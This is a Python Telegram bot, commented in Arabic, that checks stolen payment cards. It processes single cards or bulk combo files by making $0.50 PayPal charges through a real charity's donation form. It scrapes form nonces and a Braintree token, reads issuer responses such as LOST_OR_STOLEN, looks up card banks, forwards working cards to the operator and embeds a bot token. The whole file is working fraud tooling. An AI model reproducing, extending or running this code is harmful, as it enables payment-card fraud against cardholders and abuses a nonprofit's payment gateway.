import telebot
import time
import threading
from telebot import types
import requests, re, base64
from requests_toolbelt import MultipartEncoder
from user_agent import generate_user_agent
from datetime import datetime

# توكن البوت
token = '7792196548:AAHaWkIJXqnWxj51IJm0SI4_DWDpiMOCfiU'
bot = telebot.TeleBot(token, parse_mode="HTML")

# ايدي حسابك
admin = 6936293942
myid = ['6936293942']
stop = {}
user_gateways = {}
stop_flags = {}
stopuser = {}
command_usage = {}

# =======================
# الكيبورد الرئيسي
# =======================
mes = types.InlineKeyboardMarkup(row_width=1)
mes.add(
    types.InlineKeyboardButton("▶️ Start", callback_data="start")
)

# =======================
# كيبورد الرجوع
# =======================
back_kb = types.InlineKeyboardMarkup(row_width=1)
back_kb.add(
    types.InlineKeyboardButton("🔙 رجوع", callback_data="back")
)

# =======================
# /start command
# =======================
@bot.message_handler(commands=["start"])
def handle_start(message):
    name = message.from_user.first_name

    sent_message = bot.send_message(
        chat_id=message.chat.id,
        text="👹 Starting..."
    )

    time.sleep(1)

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=sent_message.message_id,
        text=f"Hi {name}, Welcome To meedo bot (Paypal Charge 0.50$)",
        reply_markup=mes
    )

# =======================
# زر Start
# =======================
@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    bot.answer_callback_query(call.id)

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="""- مرحباً بك في بوت فحص
Charged ✅

• للفحص اليدوي: /chk
• للكومبو: فقط ارسل الملف
""",
        reply_markup=back_kb
    )

# =======================
# زر رجوع 🔙
# =======================
@bot.callback_query_handler(func=lambda call: call.data == 'back')
def handle_back(call):
    name = call.from_user.first_name
    bot.answer_callback_query(call.id)

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"Hi {name}, Welcome To meedo bot (paypal charge 0.50$)",
        reply_markup=mes
    )

# =======================
# دالة الفحص للبوابة paypal custom
# =======================
def check_paypal_custom_gate(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        r = requests.Session()
        user = generate_user_agent()
        
        headers = {
            'user-agent': user,
        }
        
        response = r.get('https://www.rarediseasesinternational.org/donations/donate/', 
                        cookies=r.cookies, headers=headers, timeout=10)
        
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        
        headers = {
            'origin': 'https://rarediseasesinternational.org',
            'referer': 'https://www.rarediseasesinternational.org/donations/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://www.rarediseasesinternational.org/donations/donate/',
            'give-form-url': 'https://www.rarediseasesinternational.org/donations/donate/',
            'give-form-minimum': '0.50',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '0.50',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'meedo',
            'give_last': 'rights and',
            'give_email': 'meedo22@gmail.com',
            'card_name': 'meedo',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        response = r.post('https://rarediseasesinternational.org/wp-admin/admin-ajax.php', 
                         cookies=r.cookies, headers=headers, data=data, timeout=10)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://www.rarediseasesinternational.org/donations/donate/'),
            'give-form-url': (None, 'https://www.rarediseasesinternational.org/donations/donate/'),
            'give-form-minimum': (None, '0.50'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.50'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'meedo'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'meedo22@gmail.com'),
            'card_name': (None, 'meedo'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': 'https://rarediseasesinternational.org',
            'referer': 'https://www.rarediseasesinternational.org/donations/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {
            'action': 'give_paypal_commerce_create_order',
        }
        
        response = r.post(
            'https://rarediseasesinternational.org/wp-admin/admin-ajax.php',
            params=params,
            cookies=r.cookies,
            headers=headers,
            data=data,
            timeout=10
        )
        
        tok = (response.json()['data']['id'])
        
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        response = r.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
            headers=headers,
            json=json_data,
            timeout=10
        )
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://www.rarediseasesinternational.org/donations/donate/'),
            'give-form-url': (None, 'https://www.rarediseasesinternational.org/donations/donate/'),
            'give-form-minimum': (None, '0.50'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.50'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'meedo'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'meedo22@gmail.com'),
            'card_name': (None, 'meedo'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': 'https://rarediseasesinternational.org',
            'referer': 'https://www.rarediseasesinternational.org/donations/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {
            'action': 'give_paypal_commerce_approve_order',
            'order': tok,
        }
        
        response = r.post(
            'https://rarediseasesinternational.org/wp-admin/admin-ajax.php',
            params=params,
            cookies=r.cookies,
            headers=headers,
            data=data,
            timeout=10
        )
        
        text = response.text
        
        if 'true' in text or 'sucsess' in text or 'COMPLETED' in text:    
            return "Charge 🔥"
        elif 'INSUFFICIENT_FUNDS' in text:
            return 'Insufficient Funds 💸'
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return 'INVALID_ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED"
        elif 'ACCOUNT BLOCKED BY ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return 'ORDER_NOT_APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return 'PICKUP_CARD_SPECIAL_CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY"
        elif 'GENERIC_DECLINE' in text:
            return 'GENERIC_DECLINE'
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION"
        elif 'TRANSACTION_NOT PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return 'PAYMENT_DENIED'
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return 'SECURITY_VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "EXCEED_LIMIT"
        else:
            try:
                result = response.json()['data']['error']
                return f"{result}"
            except:
                return "UNKNOWN_ERROR"
                
    except Exception as e:
        return f"ERROR"

# =======================
# دالة الفحص الرئيسية
# =======================
def UniversalBraintreeChecker(ccx):
    # استخدام بوابة paypal custom
    result = check_paypal_custom_gate(ccx)
    
    return result

# =======================
# دالة تنظيف البطاقة
# =======================
def reg(cc):
    try:
        regex = r'\d+'
        matches = re.findall(regex, cc)
        match = ''.join(matches)
        n = match[:16]
        mm = match[16:18]
        yy = match[18:20]
        
        if yy == '20':
            yy = match[18:22]
            if n.startswith("3"):
                cvc = match[22:26]
            else:
                cvc = match[22:25]
        else:
            if n.startswith("3"):
                cvc = match[20:24]
            else:
                cvc = match[20:23]
                
        cc = f"{n}|{mm}|{yy}|{cvc}"
        
        if not re.match(r'^\d{16}$', n):
            return None
        if not re.match(r'^\d{3,4}$', cvc):
            return None
            
        return cc
    except:
        return None

# =======================
# دالة معلومات البنك
# =======================
def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/"+zh, timeout=5).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        
        mn = f'''[𖦹] 𝐈𝐧𝐟𝐨: {brand} - {card_type} - {level}
[𖦹] 𝐁𝐚𝐧𝐤: {bank} - {country_flag}
[𖦹] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_name} [ {country_flag} ]'''
        return mn
    except:
        return '[𖦹] 𝐈𝐧𝐟𝐨: No Info\n[𖦹] 𝐁𝐚𝐧𝐤: No Bank\n[𖦹] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: No Country'

# =======================
# دالة فحص البطاقة الفردية
# =======================
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def my_ali4(message):
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id
    
    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {
            'last_time': datetime.now()
        }
    
    if command_usage[idt]['last_time'] is not None:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
            return
    
    ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
    
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text
    
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    start_time = time.time()
    try:
        command_usage[idt]['last_time'] = datetime.now()
        last = UniversalBraintreeChecker(cc)
    except Exception as e:
        last = 'ERROR'
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    # تحديث الرسالة حسب النتيجة
    if 'Charge 🔥' in last:
        status = "𝐂𝐡𝐚𝐫𝐠𝐞 🔥"
        title = "𝐂𝐡𝐚𝐫𝐠𝐞 🔥"
        proxy_status = "live✅"
    elif 'Insufficient Funds 💸' in last:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        title = "Insufficient Funds 💸"
        proxy_status = "live✅"
    elif 'ERROR' in last:
        status = "𝐄𝐑𝐑𝐎𝐑"
        title = "ERROR"
        proxy_status = "dead❌"
    else:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
        title = "DECLINED"
        proxy_status = "live✅"
    
    bin_info = dato(cc[:6])
    
    # إزالة علامة ❌ من رسالة الرفض في الفحص الفردي
    if '❌' in last:
        last = last.replace('❌', '').strip()
    
    msg = f'''{title}
 Paypal_Charge_Custom_0.50$  [mass] 🐦‍🔥
- - - - - - - - - - - - - - - - - - - - - - -
[𖦹] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[𖦹] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
[𖦹] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {last}
- - - - - - - - - - - - - - - - - - - - - - -
{bin_info}
- - - - - - - - - - - - - - - - - - - - - - -
[𖦹] 𝐓𝐢𝐦𝐞: {execution_time:.1f} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: ({proxy_status})
[𖦹] 𝐆𝐚𝐭𝐞: paypal custom
𝐁𝐎𝐓 𝐃𝐞𝐕: [𝒎𝒆𝒆𝒅𝒐🦊]
OWNER: @x_3l6
🍀'''
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

# =======================
# فحص الملف
# =======================
@bot.message_handler(content_types=('document'))
def GTA(message):
    user_id = str(message.from_user.id)
    name = message.from_user.first_name or message.from_user.username or "User"

    bts = types.InlineKeyboardMarkup()
    soso = types.InlineKeyboardButton(text='paypal custom', callback_data='ottpa2')  # تغيير الاسم
    bts.add(soso)
    bot.reply_to(message, 'Select the type of examination', reply_markup=bts)
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"com{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error downloading file: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
    def my_ali():
        user_id = str(call.from_user.id)
        charge_count = 0
        insf_count = 0
        declined_count = 0
        filename = f"com{user_id}.txt"
        
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="- Please Wait Processing Your File ..")
        
        with open(filename, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            stopuser.setdefault(user_id, {})['status'] = 'start'
            
            for cc in lino:
                if stopuser.get(user_id, {}).get('status') == 'stop':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f'''The Has Stopped Checker. 🤓
                        
Charge 🔥 : {charge_count}
Insufficient Funds 💸 : {insf_count}
Declined : {declined_count}  # إزالة ❌
Total! : {charge_count + insf_count + declined_count} / {total}
Dev! : meedo
OWNER: @x_3l6''')
                    return
                
                cc = cc.strip()
                if not cc:
                    continue
                    
                try:
                    start_time = time.time()
                    last = UniversalBraintreeChecker(cc)
                except Exception as e:
                    last = "ERROR"
                
                # تحديث العداد حسب النتيجة
                if 'Charge 🔥' in last:
                    charge_count += 1
                    counter_text = "Charge 🔥"
                elif 'Insufficient Funds 💸' in last:
                    insf_count += 1
                    counter_text = "Insufficient Funds 💸"
                else:
                    declined_count += 1
                    counter_text = "Declined"  # إزالة ❌
                
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"- Status! : {last} •", callback_data='u8')
                cm2 = types.InlineKeyboardButton(f"- Charge 🔥 : [ {charge_count} ] •", callback_data='x')
                cm3 = types.InlineKeyboardButton(f"- Insufficient Funds 💸 : [ {insf_count} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"- Declined : [ {declined_count} ] •", callback_data='x')  # إزالة ❌
                cm5 = types.InlineKeyboardButton(f"- Total! : [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton("[ Stop Checker! ]", callback_data='stop')
                mes.add(cm1, status, cm2, cm3, cm4, cm5, stop)
                
                end_time = time.time()
                execution_time = end_time - start_time
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''- Checker Running... ☑️
- Time: {execution_time:.2f}s''',
                    reply_markup=mes
                )
                
                # إرسال نتيجة الشحن والأموال غير الكافية
                if 'Charge 🔥' in last or 'Insufficient Funds 💸' in last:
                    if 'Charge 🔥' in last:
                        title = "𝐂𝐡𝐚𝐫𝐠𝐞 🔥"
                        status_text = "𝐂𝐡𝐚𝐫𝐠𝐞 🔥"
                    else:
                        title = "Insufficient Funds 💸"
                        status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                    
                    bin_info = dato(cc[:6]) if len(cc) >= 6 else "No Info"
                    proxy_status = "live✅"
                    
                    msg = f'''{title}
 Paypal_Charge_Custom_0.50$  [mass] 🐦‍🔥
- - - - - - - - - - - - - - - - - - - - - - -
[𖦹] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[𖦹] 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
[𖦹] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {last}
- - - - - - - - - - - - - - - - - - - - - - -
{bin_info}
- - - - - - - - - - - - - - - - - - - - - - -
[𖦹] 𝐓𝐢𝐦𝐞: {execution_time:.1f} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: ({proxy_status})
[𖦹] 𝐆𝐚𝐭𝐞: paypal custom
𝐁𝐎𝐓 𝐃𝐞𝐕: [𝒎𝒆𝒆𝒅𝒐🦊]
OWNER: @x_3l6
🍀'''
                    bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                
                time.sleep(10)
        
        # رسالة الانتهاء
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''The Inspection Was Completed. 🥳
    
Charge 🔥 : {charge_count}
Insufficient Funds 💸 : {insf_count}
Declined : {declined_count}  # إزالة ❌
Total! : {charge_count + insf_count + declined_count}
Dev! : meedo
OWNER: @x_3l6''')
    
    my_thread = threading.Thread(target=my_ali)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass

print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(3)
